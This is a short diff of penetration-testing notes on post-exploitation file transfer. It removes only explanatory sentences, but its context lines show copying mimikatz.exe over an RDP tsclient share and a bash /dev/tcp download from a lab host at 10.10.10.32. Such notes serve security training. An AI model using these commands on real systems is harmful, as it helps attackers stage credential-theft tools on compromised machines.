@@ -329,7 +329,6 @@ https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 
 ![rdp](assets/rdp.png)
 
-After selecting the drive, we can interact with it in the remote session as follows: 
 
 ```
 copy \\tsclient\c\temp\mimikatz.exe .
@@ -391,7 +390,6 @@ https://xapax.gitbooks.io/security/content/transfering_files_to_windows.html
 
 ### Bash (/dev/tcp)
 
-There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads. 
 
 ```bash
 exec 3<>/dev/tcp/10.10.10.32/80
@@ -400,8 +398,6 @@ cat <&3
 ```
 
 ### PHP
-
-PHP is also very prevalent, and provides multiple file transfer methods.
 
 #### file_get_contents() 
 
@@ -474,8 +470,6 @@ func main() {
 
 
 # Web Servers
-
-In addition to Apache and Nginx, it is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed or access to the Internet, in which case a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed.
 
 
 ```bash
